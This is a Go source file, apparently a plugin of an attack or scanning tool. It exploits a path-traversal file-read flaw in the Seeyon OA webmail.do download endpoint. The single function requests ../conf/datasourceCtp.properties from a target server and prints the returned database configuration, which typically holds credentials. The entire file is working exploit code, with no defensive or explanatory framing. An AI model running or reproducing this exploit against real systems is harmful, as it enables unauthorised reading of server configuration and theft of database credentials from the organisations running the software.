package plugin

import (
	"fmt"
	"io/ioutil"
	"net/http"

	"github.com/fatih/color"
)

func Info_readfile(urlFlag string) error {
	endpoint := fmt.Sprintf("%s/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties", urlFlag)
	req, err := http.NewRequest("GET", endpoint, nil)
	if err != nil {
		return err
	}

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	switch resp.StatusCode {
	case http.StatusOK:
		color.Green("DataConfig:")
		fmt.Println(string(body))
	default:
		color.Red("readfile接口不存在")
	}

	return nil
}
